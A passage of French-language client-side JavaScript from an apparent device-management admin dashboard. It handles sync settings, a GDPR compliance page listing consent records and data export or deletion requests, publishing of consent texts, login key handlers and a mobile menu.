    const r=await fetch(`${API}/api/sync-config/${currentDetailDevice}`,{method:'POST',headers:authHeaders(),body:JSON.stringify(config)});
    const d=await r.json();
    if(d.ok){alert('Configuration de synchronisation sauvegardée.');}
    else{alert(d.error||'Erreur');}
  }catch(err){alert('Erreur réseau');}
}

// ─── CONFORMITÉ RGPD ───

async function loadCompliancePage(){
  try{
    const[consents,requests,texts]=await Promise.all([
      fetchJ('/api/consent/records'),
      fetchJ('/api/data-requests'),
      fetchJ('/api/consent/texts')
    ]);

    // Stats
    const activeConsents=consents.filter(c=>!c.revokedAt);
    document.getElementById('comp-total-consents').textContent=activeConsents.length;
    const pendingReqs=requests.filter(r=>r.status==='pending');
    document.getElementById('comp-pending-requests').textContent=pendingReqs.length;
    if(pendingReqs.length>0){const b=document.getElementById('rgpd-badge');b.style.display='inline';b.textContent=pendingReqs.length;}
    else{document.getElementById('rgpd-badge').style.display='none';}
    const latestText=texts[0];
    document.getElementById('comp-consent-version').textContent=latestText?'v'+latestText.version:'–';
    const devicesWithoutConsent=allDevices.filter(d=>!d.consentGiven);
    document.getElementById('comp-devices-without').textContent=devicesWithoutConsent.length;

    // Texte actuel
    if(latestText){
      document.getElementById('compliance-current-text').textContent=`[v${latestText.version}] ${latestText.title}\n\n${latestText.body}`;
    }else{
      document.getElementById('compliance-current-text').textContent='Aucun texte de consentement configuré.';
    }

    // Liste des consentements
    const consentsEl=document.getElementById('compliance-consents-list');
    if(!consents.length){consentsEl.innerHTML='<p class="empty">Aucun consentement enregistré.</p>';}
    else{
      consentsEl.innerHTML=consents.map(c=>{
        const revoked=c.revokedAt;
        const statusBadge=revoked?'<span style="color:var(--danger);font-weight:600;font-size:0.65rem">RÉVOQUÉ</span>':'<span style="color:var(--success);font-weight:600;font-size:0.65rem">ACTIF</span>';
        return`<div class="event-row">
          <span class="event-badge" style="background:#1e3a2e;color:#86efac;min-width:60px">v${esc(c.consentVersion)}</span>
          <div class="event-content">
            <div style="font-weight:500;font-size:0.8rem">${esc(c.userName||c.userId||'Utilisateur inconnu')}</div>
            <div class="event-detail">${esc(c.deviceName||c.deviceId.slice(0,8)+'…')} ${statusBadge}</div>
          </div>
          <span class="event-time">${fmtTime(c.consentedAt)}</span>
        </div>`;
      }).join('');
    }

    // Liste des demandes RGPD
    const reqEl=document.getElementById('compliance-requests-list');
    if(!requests.length){reqEl.innerHTML='<p class="empty">Aucune demande RGPD.</p>';}
    else{
      reqEl.innerHTML=requests.map(r=>{
        const typeLabel=r.type==='export'?'Export':'Suppression';
        const typeIcon=r.type==='export'?'📦':'🗑️';
        const statusColors={pending:'#f59e0b',approved:'#22c55e',rejected:'#ef4444'};
        const statusLabels={pending:'En attente',approved:'Approuvée',rejected:'Rejetée'};
        const color=statusColors[r.status]||'var(--text-muted)';
        const actions=r.status==='pending'?`
          <div style="display:flex;gap:4px;margin-top:4px">
            <button class="btn" style="font-size:0.65rem;padding:2px 8px;background:var(--success)" onclick="processDataRequest(${r.id},'approve')">Approuver</button>
            <button class="btn" style="font-size:0.65rem;padding:2px 8px;background:var(--danger)" onclick="processDataRequest(${r.id},'reject')">Rejeter</button>
          </div>`:'';
        return`<div class="event-row">
          <span class="event-badge" style="background:${color}20;color:${color};min-width:80px">${typeIcon} ${esc(typeLabel)}</span>
          <div class="event-content">
            <div style="font-weight:500;font-size:0.8rem">${esc(r.userName||r.deviceName||r.deviceId.slice(0,8)+'…')}</div>
            <div class="event-detail">Statut : <span style="color:${color};font-weight:600">${statusLabels[r.status]}</span>${r.adminNote?' – '+esc(r.adminNote):''}</div>
            ${actions}
          </div>
          <span class="event-time">${fmtTime(r.createdAt)}</span>
        </div>`;
      }).join('');
    }

  }catch(err){console.error('Erreur chargement conformité',err);}
}

async function processDataRequest(id,action){
  const adminNote=action==='reject'?prompt('Note (raison du refus) :',''):'';
  if(action==='approve'&&!confirm('Êtes-vous sûr ? Cette action peut supprimer définitivement des données.'))return;
  try{
    const r=await fetch(`${API}/api/data-requests/${id}/process`,{method:'POST',headers:authHeaders(),body:JSON.stringify({action,adminNote:adminNote||''})});
    const d=await r.json();
    if(d.ok){loadCompliancePage();}
    else{alert(d.error||'Erreur');}
  }catch(err){alert('Erreur réseau');}
}

async function createConsentText(){
  const version=document.getElementById('comp-new-version').value.trim();
  const title=document.getElementById('comp-new-title').value.trim();
  const body=document.getElementById('comp-new-body').value.trim();
  if(!version){alert('Entrez un numéro de version');return;}
  if(!body){alert('Entrez le contenu du texte');return;}
  try{
    const r=await fetch(`${API}/api/consent/texts`,{method:'POST',headers:authHeaders(),body:JSON.stringify({version,title,body})});
    const d=await r.json();
    if(d.ok){
      alert('Nouvelle version du texte de consentement publiée.');
      document.getElementById('comp-new-version').value='';
      document.getElementById('comp-new-body').value='';
      loadCompliancePage();
    }else{alert(d.error||'Erreur');}
  }catch(err){alert('Erreur réseau');}
}

// Enter key handlers
document.getElementById('login-pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
document.getElementById('login-totp').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin2FA();});

// Mobile menu
function toggleMobileMenu(){
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebar-overlay').classList.toggle('show');
}
function closeMobileMenu(){
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
}
// Fermer le menu mobile quand on clique sur un lien
document.querySelectorAll('.nav-item[data-page]').forEach(i=>{
  i.addEventListener('click',()=>{closeMobileMenu();});
});
